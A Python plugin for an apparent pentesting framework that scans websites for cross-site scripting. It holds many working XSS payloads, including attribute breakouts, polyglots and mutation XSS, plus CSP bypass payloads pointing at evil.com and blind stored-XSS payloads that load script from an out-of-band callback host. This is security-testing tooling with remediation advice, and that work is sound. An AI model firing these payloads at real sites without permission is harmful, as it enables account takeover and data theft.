"""Advanced XSS — context-aware injection, DOM XSS detection, CSP bypass.

Escalates beyond basic reflection detection:
1. Context-aware payloads (HTML attr, JS string, URL, CSS)
2. DOM XSS sink/source pattern detection in JavaScript
3. CSP bypass techniques when CSP is present
4. Stored XSS indicators via POST → GET verification
"""

from __future__ import annotations

import re
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

CANARY = "bsk7x3q"

# Context-specific payloads
CONTEXT_PAYLOADS: dict[str, list[tuple[str, str]]] = {
    "html_tag": [
        (f"<img src=x onerror=alert({CANARY})>", "img onerror"),
        (f"<svg/onload=alert({CANARY})>", "svg onload"),
        (f"<details open ontoggle=alert({CANARY})>", "details ontoggle"),
        (f"<math><mtext><table><mglyph><svg><mtext>"
         f"<textarea><path d=x onerror=alert({CANARY})>",
         "mXSS mutation"),
    ],
    "html_attr": [
        (f'" onfocus=alert({CANARY}) autofocus="', "attr breakout onfocus"),
        (f"' onfocus=alert({CANARY}) autofocus='", "attr breakout single"),
        (f'" onmouseover=alert({CANARY}) "', "attr onmouseover"),
        (f"javascript:alert({CANARY})", "attr javascript proto"),
    ],
    "js_string": [
        (f"';alert({CANARY});//", "js string break single"),
        (f'";alert({CANARY});//', "js string break double"),
        (f"\\';alert({CANARY});//", "js escaped break single"),
        (f"`-alert({CANARY})-`", "js template literal"),
        (f"</script><svg/onload=alert({CANARY})>", "script tag escape"),
    ],
    "js_template": [
        (f"${{alert({CANARY})}}", "template literal injection"),
        (f"${{constructor.constructor('alert({CANARY})')()}}", "template proto"),
    ],
    "url_context": [
        (f"javascript:alert({CANARY})", "javascript proto"),
        (f"data:text/html,<script>alert({CANARY})</script>", "data URI"),
        (f"//evil.com/{CANARY}", "protocol-relative URL"),
    ],
    "polyglot": [
        (
            f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert({CANARY})"
            f" )//%%0telerik|0telerik|0/telerik//\\",
            "universal polyglot",
        ),
        (f"<svg/onload=alert({CANARY})><!--", "svg polyglot"),
        (f"'\"><img src=x onerror=alert({CANARY})>", "breakout polyglot"),
        (
            f"javascript:alert({CANARY})//</title></style></textarea>"
            f"</script>--><svg/onload='+/\"/+/onmouseover=1/+/[*/[]"
            f"/+alert({CANARY})//'>",
            "mega polyglot",
        ),
    ],
}

# DOM XSS sources and sinks
DOM_SOURCES = [
    # Location-based sources
    "location.href", "location.search", "location.hash",
    "location.pathname", "location.origin", "location.protocol",
    # Document-based sources
    "document.URL", "document.documentURI", "document.baseURI",
    "document.referrer", "document.cookie", "document.domain",
    # Window / navigator sources
    "window.name", "navigator.userAgent", "navigator.language",
    # Storage sources
    "localStorage.getItem", "sessionStorage.getItem",
    # Messaging / history sources
    "postMessage", "history.pushState", "history.replaceState",
    # Network sources
    "WebSocket.url", "XMLHttpRequest.responseText",
    "XMLHttpRequest.responseXML", "fetch(",
    # Misc sources
    "serviceWorker.register", "URL.searchParams",
    "URLSearchParams(", "FormData(",
]

DOM_SINKS = [
    # Direct execution sinks
    "eval(", "setTimeout(", "setInterval(", "Function(",
    "execScript(", "msSetImmediate(", "importScripts(",
    # Document write sinks
    "document.write(", "document.writeln(",
    # DOM manipulation sinks
    ".innerHTML", ".outerHTML", ".insertAdjacentHTML(",
    "document.createElement(", ".setAttribute(",
    ".insertAdjacentElement(", ".insertAdjacentText(",
    # Navigation sinks
    "location.href=", "location.assign(", "location.replace(",
    "window.open(", "location.pathname=",
    # Element attribute sinks
    "element.src=", "element.href=", "element.action=",
    ".setAttribute('src'", ".setAttribute('href'",
    ".setAttribute('action'", ".setAttribute('background'",
    "document.domain=",
    # jQuery sinks
    "$.html(", "$(...).html(", ".append(", ".prepend(",
    ".after(", ".before(", ".replaceWith(", ".wrap(",
    "$.globalEval(", "jQuery.globalEval(",
    # Angular / Vue / React sinks
    "angular.element(", "ng-bind-html", "bypassSecurityTrust",
    "v-html", "dangerouslySetInnerHTML",
    # DOM API sinks
    "DOMParser", "createContextualFragment(",
    "Range.createContextualFragment(",
    # Blob / Worker sinks
    "new Blob(", "new Worker(", "URL.createObjectURL(",
    "SharedWorker(",
    # Script creation sinks
    "document.createElement('script'",
    'document.createElement("script"',
]

# CSP bypass payloads (when specific CSP directives are detected)
CSP_BYPASSES: dict[str, list[tuple[str, str]]] = {
    "unsafe-inline": [
        (
            f"<script>alert({CANARY})</script>",
            "inline script allowed",
        ),
        (
            f"<style>@import'javascript:alert({CANARY})'</style>",
            "inline style import",
        ),
    ],
    "unsafe-eval": [
        (
            f"<img src=x onerror=\"eval('alert({CANARY})')\">",
            "eval in handler",
        ),
        (
            f"<img src=x onerror=\"Function('alert({CANARY})')();\">",
            "Function constructor eval",
        ),
    ],
    "data:": [
        (
            f"<object data='data:text/html,"
            f"<script>alert({CANARY})</script>'>",
            "data URI object",
        ),
        (
            f"<embed src='data:text/html,"
            f"<script>alert({CANARY})</script>'>",
            "data URI embed",
        ),
    ],
    "nonce": [
        (
            "<base href=//evil.com/>"
            "<script nonce src=/xss.js></script>",
            "base-uri nonce bypass",
        ),
        (
            f"<script nonce>alert({CANARY})</script>",
            "nonce reuse injection",
        ),
    ],
    "strict-dynamic": [
        (
            f"<script>document.createElement('script')"
            f".text='alert({CANARY})';"
            f"document.body.append(document.createElement"
            f"('script'))</script>",
            "strict-dynamic script propagation",
        ),
        (
            f"<script>import('data:text/javascript,"
            f"alert({CANARY})')</script>",
            "strict-dynamic import bypass",
        ),
    ],
    "base-uri": [
        (
            "<base href='https://evil.com/'>"
            "<script src='xss.js'></script>",
            "base-uri hijack",
        ),
    ],
    "*.googleapis.com": [
        (
            f"<script src='https://www.googleapis.com/"
            f"customsearch/v1?callback=alert({CANARY})'>"
            f"</script>",
            "JSONP via googleapis",
        ),
    ],
    "*.cloudflare.com": [
        (
            f"<script src='https://cdnjs.cloudflare.com/"
            f"ajax/libs/angular.js/1.6.0/angular.min.js'>"
            f"</script><div ng-app>"
            f"{{{{constructor.constructor("
            f"'alert({CANARY})')()}}}}</div>",
            "Angular CSP bypass via cdnjs",
        ),
    ],
    "*.google.com": [
        (
            f"<script src='https://accounts.google.com/"
            f"o/oauth2/revoke?callback=alert({CANARY})'>"
            f"</script>",
            "JSONP via google oauth",
        ),
    ],
    "angular": [
        (
            f"{{{{$on.constructor('alert({CANARY})')()}}}}",
            "Angular sandbox escape v1.6+",
        ),
        (
            f"{{{{a]constructor.prototype.charAt="
            f"[].join;$eval('x]alert({CANARY})')}}}}",
            "Angular sandbox escape v1.3-1.5",
        ),
    ],
    "vue": [
        (
            f"{{{{constructor.constructor('alert({CANARY})')()}}}}",
            "Vue.js template injection v2",
        ),
    ],
    "prototype": [
        (
            f"<script src='https://cdnjs.cloudflare.com/"
            f"ajax/libs/prototype/1.7.2/prototype.js'>"
            f"</script><isindex type=image src=1 "
            f"onerror=alert({CANARY})>",
            "Prototype.js isindex CVE",
        ),
    ],
}

# Parameters to test
XSS_PARAMS = [
    "q", "search", "query", "s", "keyword", "name",
    "redirect", "url", "callback", "next", "return",
    "error", "message", "msg", "text", "content",
]

SCAN_PATHS = [
    "/", "/search", "/search?q=", "/feedback", "/error",
    "/callback", "/comment", "/contact", "/register", "/signup",
    "/profile", "/settings", "/api/search", "/graphql",
    "/preview", "/share", "/redirect",
]


class XssAdvancedPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="xss_advanced",
        display_name="Advanced XSS Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Context-aware XSS detection with DOM analysis, "
            "CSP bypass, and stored XSS indicators"
        ),
        depends_on=["xss_basic"],
        produces=["xss_advanced_findings"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"xss_advanced": []},
            )

        # WAF bypass integration
        waf_detected = False
        if ctx.waf_bypass:
            ctx.waf_bypass.set_waf_from_pipeline(ctx.pipeline, target.host)
            waf_detected = getattr(ctx.waf_bypass, "waf_detected", False)

        # Get basic XSS results from pipeline
        xss_key = f"xss_basic:{target.host}"
        xss_result = ctx.pipeline.get(xss_key)
        if xss_result and xss_result.ok:
            xss_result.data.get("xss_tests", [])

        # Get CSP header from http_headers pipeline
        csp = self._get_csp(target.host, ctx)

        # Extend paths from pipeline
        extra_paths = ctx.state.get("discovered_api_paths", {}).get(target.host, [])
        scan_paths = list(SCAN_PATHS)
        scan_paths.extend(p for p in extra_paths if p not in scan_paths)

        # Use crawled params if available
        crawled = ctx.state.get("crawled_params", {}).get(target.host, [])
        if crawled:
            extra_params = [p for p in crawled if p not in XSS_PARAMS]
            xss_params = list(XSS_PARAMS) + extra_params[:10]
        else:
            xss_params = list(XSS_PARAMS)

        # Phase 1: Context-aware XSS on reflected params
        for path in scan_paths[:8]:
            if ctx.should_stop or len(findings) >= 5:
                break

            for param in xss_params:
                if ctx.should_stop or len(findings) >= 5:
                    break

                # Probe with canary to detect reflection context
                context = await self._detect_context(
                    ctx, base_url, path, param,
                )
                if not context:
                    continue

                # Test context-specific payloads
                payloads = CONTEXT_PAYLOADS.get(context, [])
                for payload, desc in payloads:
                    if ctx.should_stop:
                        break

                    # Apply WAF bypass if WAF detected
                    if waf_detected and ctx.waf_bypass:
                        encoded = ctx.waf_bypass.encode(payload, "xss")
                        if encoded != payload:
                            payload = encoded
                            desc = f"{desc} (WAF bypass)"

                    url = f"{base_url}{path}?{param}={quote(payload)}"
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=8.0)
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )

                            if CANARY in body and self._payload_intact(payload, body):
                                tested.append({
                                    "path": path,
                                    "param": param,
                                    "payload": payload,
                                    "context": context,
                                    "description": desc,
                                })
                                findings.append(Finding.high(
                                    f"Context-aware XSS ({context}): "
                                    f"{path}?{param}=",
                                    description=(
                                        f"XSS in {context} context via {desc}. "
                                        f"Payload reflected without sanitization."
                                    ),
                                    evidence=f"Payload: {payload[:80]}",
                                    remediation=(
                                        f"Apply {context}-specific output encoding. "
                                        "Implement Content-Security-Policy."
                                    ),
                                    tags=["pentesting", "xss", context],
                                ))
                                break
                    except Exception:
                        continue

                # Also try polyglot payloads regardless of context
                if not any(
                    t.get("param") == param and t.get("path") == path
                    for t in tested
                ):
                    for payload, desc in CONTEXT_PAYLOADS.get("polyglot", []):
                        if ctx.should_stop:
                            break
                        test_payload = payload
                        if waf_detected and ctx.waf_bypass:
                            encoded = ctx.waf_bypass.encode(payload, "xss")
                            if encoded != payload:
                                test_payload = encoded
                                desc = f"{desc} (WAF bypass)"
                        url = (
                            f"{base_url}{path}"
                            f"?{param}={quote(test_payload)}"
                        )
                        try:
                            async with ctx.rate:
                                resp = await ctx.http.get(
                                    url, timeout=8.0,
                                )
                                body = await resp.text(
                                    encoding="utf-8", errors="replace",
                                )
                                if CANARY in body and self._payload_intact(
                                    test_payload, body,
                                ):
                                    tested.append({
                                        "path": path,
                                        "param": param,
                                        "payload": test_payload,
                                        "context": "polyglot",
                                        "description": desc,
                                    })
                                    findings.append(Finding.high(
                                        f"XSS via polyglot: "
                                        f"{path}?{param}=",
                                        description=(
                                            f"Polyglot XSS via {desc}."
                                        ),
                                        evidence=(
                                            f"Payload: "
                                            f"{test_payload[:80]}"
                                        ),
                                        remediation=(
                                            "Apply context-specific "
                                            "output encoding."
                                        ),
                                        tags=[
                                            "pentesting",
                                            "xss",
                                            "polyglot",
                                        ],
                                    ))
                                    break
                        except Exception:
                            continue

        # Phase 2: DOM XSS analysis
        if not ctx.should_stop:
            dom_findings = await self._analyze_dom_xss(ctx, base_url)
            if dom_findings:
                for df in dom_findings:
                    findings.append(Finding.medium(
                        f"DOM XSS pattern: {df['sink']}",
                        description=(
                            f"JavaScript contains DOM XSS pattern: "
                            f"source={df['source']} → sink={df['sink']}"
                        ),
                        evidence=df.get("evidence", "")[:200],
                        remediation=(
                            "Sanitize DOM inputs before passing to sinks. "
                            "Use textContent instead of innerHTML."
                        ),
                        tags=["pentesting", "xss", "dom"],
                    ))
                tested.append({
                    "type": "dom_xss",
                    "patterns": dom_findings,
                })

        # Phase 3: CSP bypass (if CSP present)
        if csp and not ctx.should_stop:
            csp_findings = await self._test_csp_bypass(
                ctx, base_url, csp,
            )
            for cf in csp_findings:
                findings.append(cf)

        # Phase 4: Stored XSS indicator
        if not ctx.should_stop:
            stored = await self._test_stored_xss(ctx, base_url)
            if stored:
                findings.append(Finding.high(
                    "Potential stored XSS detected",
                    description=(
                        "Input submitted via POST was found reflected "
                        "in subsequent GET response without encoding."
                    ),
                    evidence=stored.get("evidence", "")[:200],
                    remediation=(
                        "Encode all user input on output. "
                        "Implement Content-Security-Policy."
                    ),
                    tags=["pentesting", "xss", "stored"],
                ))

        # Phase 5: Blind XSS via OOB callback
        if not ctx.should_stop and ctx.oob and ctx.oob.available:
            blind_result = await self._test_blind_xss(
                ctx, base_url, target.host,
            )
            if blind_result:
                findings.append(blind_result)

        if not findings:
            findings.append(Finding.info(
                "No advanced XSS vulnerabilities detected",
                tags=["pentesting", "xss"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"xss_advanced": tested},
        )

    async def _detect_context(
        self, ctx, base_url: str, path: str, param: str,
    ) -> str | None:
        """Detect the reflection context of a parameter."""
        probe = f"bskPROBE{CANARY}9z"
        url = f"{base_url}{path}?{param}={quote(probe)}"

        try:
            async with ctx.rate:
                resp = await ctx.http.get(url, timeout=5.0)
                body = await resp.text(encoding="utf-8", errors="replace")
        except Exception:
            return None

        if probe not in body:
            return None

        # Find context around the probe
        idx = body.find(probe)
        before = body[max(0, idx - 100):idx]
        after = body[idx + len(probe):idx + len(probe) + 100]

        # Check JavaScript string context
        if re.search(r"['\"`]\s*$", before) and re.search(r"^\s*['\"`]", after):
            return "js_string"

        # Check JavaScript template literal
        if "`" in before[-20:]:
            return "js_template"

        # Check HTML attribute context
        if re.search(r'=\s*["\']?\s*$', before):
            return "html_attr"

        # Check URL context (href, src, action attributes)
        if re.search(r'(?:href|src|action|data|formaction)\s*=\s*["\']?\s*$', before, re.I):
            return "url_context"

        # Default: HTML tag context
        if "<" in before[-50:] or ">" in after[:50]:
            return "html_tag"

        return "html_tag"

    @staticmethod
    def _payload_intact(payload: str, body: str) -> bool:
        """Check if key parts of the payload survived in the response."""
        # Check that event handlers or script tags are present
        key_parts = ["onerror", "onload", "onfocus", "onmouseover",
                      "ontoggle", "alert", "<script", "<svg", "<img",
                      "javascript:", CANARY]
        return any(part in body for part in key_parts if part in payload)

    async def _analyze_dom_xss(
        self, ctx, base_url: str,
    ) -> list[dict]:
        """Analyze JavaScript for DOM XSS source→sink patterns."""
        results: list[dict] = []

        try:
            async with ctx.rate:
                resp = await ctx.http.get(base_url, timeout=8.0)
                body = await resp.text(encoding="utf-8", errors="replace")
        except Exception:
            return results

        # Extract inline scripts
        scripts: list[str] = []
        for match in re.finditer(
            r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I,
        ):
            scripts.append(match.group(1))

        # Extract external script URLs and fetch them
        for match in re.finditer(r'<script[^>]+src=["\']([^"\']+)', body, re.I):
            src = match.group(1)
            if src.startswith("//"):
                src = f"https:{src}"
            elif src.startswith("/"):
                src = f"{base_url}{src}"
            elif not src.startswith("http"):
                src = f"{base_url}/{src}"

            # Only fetch same-origin scripts
            if base_url.split("//")[-1].split("/")[0] in src:
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(src, timeout=5.0)
                        if resp.status == 200:
                            js_body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                            scripts.append(js_body)
                except Exception:
                    continue

        # Analyze scripts for source→sink patterns
        for script in scripts:
            for source in DOM_SOURCES:
                if source not in script:
                    continue
                for sink in DOM_SINKS:
                    if sink not in script:
                        continue

                    # Find the line containing the sink
                    for line in script.split("\n"):
                        if sink in line and any(
                            s in line for s in [source, "params", "query", "hash"]
                        ):
                            results.append({
                                "source": source,
                                "sink": sink,
                                "evidence": line.strip()[:150],
                            })
                            break

        return results[:10]  # Limit results

    @staticmethod
    def _get_csp(host: str, ctx) -> str:
        """Get Content-Security-Policy from http_headers pipeline data."""
        headers_key = f"http_headers:{host}"
        headers_result = ctx.pipeline.get(headers_key)
        if not headers_result or not headers_result.ok:
            return ""

        headers = headers_result.data.get("headers", {})
        return headers.get("content-security-policy", "")

    async def _test_csp_bypass(
        self, ctx, base_url: str, csp: str,
    ) -> list[Finding]:
        """Test CSP bypass techniques based on policy analysis."""
        findings: list[Finding] = []

        for directive, bypasses in CSP_BYPASSES.items():
            if directive not in csp:
                continue

            for payload, desc in bypasses:
                url = f"{base_url}/?q={quote(payload)}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(url, timeout=5.0)
                        body = await resp.text(
                            encoding="utf-8", errors="replace",
                        )

                        if CANARY in body:
                            findings.append(Finding.medium(
                                f"CSP bypass possible: {desc}",
                                description=(
                                    f"CSP contains '{directive}' which may be "
                                    f"bypassed via {desc}"
                                ),
                                evidence=f"CSP: {csp[:100]}",
                                remediation=(
                                    f"Remove '{directive}' from CSP. "
                                    "Use strict CSP with nonces."
                                ),
                                tags=["pentesting", "xss", "csp-bypass"],
                            ))
                            break
                except Exception:
                    continue

        return findings

    async def _test_stored_xss(self, ctx, base_url: str) -> dict | None:
        """Test for stored XSS via POST then GET verification."""
        store_paths = ["/feedback", "/comment", "/contact", "/guestbook"]
        payload = f"<img src=x onerror=alert({CANARY})>"

        for path in store_paths:
            if ctx.should_stop:
                break

            # Try POST with XSS payload
            try:
                async with ctx.rate:
                    await ctx.http.post(
                        f"{base_url}{path}",
                        data={
                            "message": payload,
                            "name": f"test_{CANARY}",
                            "email": f"{CANARY}@test.com",
                        },
                        timeout=8.0,
                    )
            except Exception:
                continue

            # Check if payload appears in GET
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}", timeout=8.0,
                    )
                    body = await resp.text(
                        encoding="utf-8", errors="replace",
                    )

                    if CANARY in body and "onerror" in body:
                        return {
                            "path": path,
                            "payload": payload,
                            "evidence": (
                                f"POST to {path} with XSS payload, "
                                f"payload found in subsequent GET"
                            ),
                        }
            except Exception:
                continue

        return None

    async def _test_blind_xss(
        self, ctx, base_url: str, host: str,
    ) -> Finding | None:
        """Test for blind XSS using OOB callbacks in stored input fields."""
        probe = ctx.oob.create_probe("rce", host, "blind_xss")
        if not probe.payloads:
            return None

        # Use first HTTP payload URL for script src injection
        oob_url = next(
            (p.value for p in probe.payloads if p.protocol == "http"),
            None,
        )
        if not oob_url:
            return None

        blind_payloads = [
            f'"><script src={oob_url}></script>',
            f"'><script src={oob_url}></script>",
            f"'\"><img src=x onerror=\"fetch('{oob_url}')\">",
        ]

        store_paths = [
            "/feedback", "/contact", "/comment", "/support",
            "/api/feedback", "/api/contact", "/api/support",
        ]
        store_fields = [
            "message", "comment", "body", "text", "feedback", "name",
        ]

        for path in store_paths[:4]:
            if ctx.should_stop:
                break
            for bp in blind_payloads[:2]:
                data = {f: bp for f in store_fields}
                try:
                    async with ctx.rate:
                        await ctx.http.post(
                            f"{base_url}{path}",
                            data=data,
                            timeout=8.0,
                        )
                except Exception:
                    continue

        # Verify via OOB with longer timeout (blind XSS may take time)
        result = await ctx.oob.verify(probe.token, timeout=30)
        if result.confirmed:
            return Finding.critical(
                "Blind XSS confirmed via OOB callback",
                description=(
                    "A blind XSS payload injected into a stored field "
                    "triggered an out-of-band callback, confirming code "
                    "execution in a different user context "
                    "(e.g., admin panel)."
                ),
                evidence=(
                    f"OOB callback received from {result.source_ip} "
                    f"after {result.latency_ms:.0f}ms "
                    f"via {result.protocol}"
                ),
                remediation=(
                    "Encode all user input on output in every context. "
                    "Implement strict Content-Security-Policy. "
                    "Review admin panels for XSS in user-submitted data."
                ),
                confidence=0.95,
                verified=True,
                tags=["pentesting", "xss", "blind", "stored", "oob"],
            )
        return None
